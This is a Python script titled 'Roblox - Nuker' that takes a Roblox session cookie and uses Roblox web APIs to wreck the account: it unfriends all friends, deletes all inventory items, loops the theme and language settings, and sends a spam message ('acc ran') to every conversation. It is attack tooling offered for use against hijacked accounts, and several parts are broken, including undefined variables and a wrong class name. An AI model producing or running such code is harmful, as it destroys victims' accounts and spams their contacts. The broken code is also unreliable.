try:	
	import requests
	import os
	import time
	import threading
	import functools
except ImportError:
	os.system('pip install requests')
	os.system('pip install functools')

os.system('cls')
os.system('title Vex Services - Initializing..')
os.system('mode 100,30')
print(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mInitializing..')
time.sleep(2)

class Astral:
	def __init__(self, cookies, headers) -> None:
		super().__init__()
		self.cookies = cookies
		self.headers = headers

	def Flash(self):
		try:
			while True:
				requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(self.cookies)}, headers=self.headers,data={"themeType": "Light"})
				requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(self.cookies)}, headers=self.headers,data={"themeType": "Dark"})
				print(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mCycled Light, Dark Mode')
		except:
			pass

	def LanguageChanger(self):
		while True:
			requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(self.cookies)},headers=self.headers,data={"supportedLocaleCode": "ja_jp"})
			requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(self.cookies)},headers=self.headers,data={"supportedLocaleCode": "ko_kr"})
			print(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mChanged language')

	def DMAll(self, content = 'acc ran ; .gg/godtier'):
		req = requests.get("https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",cookies={'.ROBLOSECURITY': str(self.cookies)}, headers=self.headers).json()
		for conversation in req:
			requests.post("https://chat.roblox.com/v2/send-message",data={"conversationId": conversation["id"], "message": message}, cookies={'.ROBLOSECURITY': str(self.cookies)}, headers=self.headers)
			if r.status_code in [200, 201, 204]:
				ccc = conversation['id']
				print(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mDirect Message {ccc}')
			elif r.status_code == 429:
				print(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mRate Limited')
				time.sleep(10)
				self.DMAll()
			else:
				print('\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mUnknown request status {}'.format(r.status_code))
				self.DMAll()

	def ItemRemover(self):
		r = requests.get(f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",cookies={'.ROBLOSECURITY': str(self.cookies)}, headers=self.headers).json()["Data"]["Items"]
		for item in r:
			time.sleep(3.14159265359)
			ii = item["Item"]["AssetId"]
			req = requests.post("https://www.roblox.com/asset/delete-from-inventory", data={"assetId": str(ii)},cookies={'.ROBLOSECURITY': str(self.cookies)}, headers=self.headers)
			if req.status_code in [200, 201, 204]:
				print(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mRemoved {ii} from inventory')
			elif req.status_code == 429:
				print(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mRate Limited')
				time.sleep(10)
				self.ItemRemover()

	def Unfriend(self):
		r = requests.get(f"https://friends.roblox.com/v1/users/{self.userid}/friends", cookies={'.ROBLOSECURITY': str(self.cookies)}).json()['data']
		friends = [r['id'] for friends in r]
		for i in friends:
			r = requests.post(f"https://friends.roblox.com/v1/users/{i}/unfriend",cookies={'.ROBLOSECURITY': str(self.cookies)}, headers=self.headers)
			if r.status_code in [200, 201, 204]:
				print('\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mRemoved {}'.format(i))
			elif r.status_code == 429:
				print('\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mRate Limited')
				time.sleep(10)
				self.Unfriend()

	def Bootup(self):
		print('\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mPress Enter to start')
		msgg = input('\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mDM Message ')
		r = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":self.cookies}).json()
		self.userid = r['id']
		threading.Thread(target=self.Flash).start()
		threading.Thread(target=self.Unfriend).start()
		threading.Thread(target=self.LanguageChanger).start()
		threading.Thread(target=self.ItemRemover).start()
		threading.Thread(target=self.DMAll, args=(msgg,)).start()

def Menu():
	os.system('cls')
	os.system('title Vex Services - Initialized')
	print('''
			  	\033[38;2;147;142;255m | Roblox - Nuker |
			 
			  \033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mConnected Program
			  \033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mDeveloper: StanTheMan#0001 ( disabled )
			  \033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mWelcome''')
	print('''
\33[37m═══════════════════════════════════════════════════════════════════════════════════════════════════''')
	cookies = input(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mPlease Enter Roblox Cookie: ')
	cookie_ = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookies)})
	if cookie_.status_code in [200, 201, 204]:
		print(f'\033[38;2;137;142;255m[ \33[37m>\033[38;2;137;142;255m ] \33[37mValid Cookies!')
		r = requests.post("https://auth.roblox.com/v2/logout", cookies={'.ROBLOSECURITY': cookies})
		xsrf = r.headers["x-csrf-token"]
		api = vexservices(cookies, {'X-CSRF-TOKEN': str(xsrf)})
		api.Bootup()
	else:
		Menu()

if __name__ == '__main__':
	Menu()